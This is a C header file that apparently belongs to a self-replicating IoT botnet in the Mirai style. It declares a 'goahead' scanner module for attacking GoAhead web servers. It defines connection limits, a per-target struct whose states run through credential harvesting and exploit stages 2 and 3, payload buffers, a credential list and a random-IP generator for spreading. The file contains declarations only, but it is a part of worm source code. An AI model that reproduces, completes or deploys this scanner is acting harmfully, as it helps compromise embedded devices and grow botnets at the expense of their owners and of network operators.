#pragma once
#ifdef SELFREP


#include <stdint.h>

#include "includes.h"

#define goahead_SCANNER_MAX_CONNS 128
#define goahead_SCANNER_RAW_PPS 160

#define goahead_SCANNER_RDBUF_SIZE 256
#define goahead_SCANNER_HACK_DRAIN 64

struct goahead_setup_connection
{
    int fd, last_recv;
    enum
    {
        goahead_SC_CLOSED,
        goahead_SC_CONNECTING,
        goahead_SC_GET_CREDENTIALS,
        goahead_SC_EXPLOIT_STAGE2,
        goahead_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[goahead_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[256], payload_buf2[256];
    int credential_index;
};

void goahead_scanner_init();
void goahead_scanner_kill(void);

static void goahead_setup_connection(struct goahead_setup_connection *);
static ipv4_t goahead_get_random_ip(void);
#endif
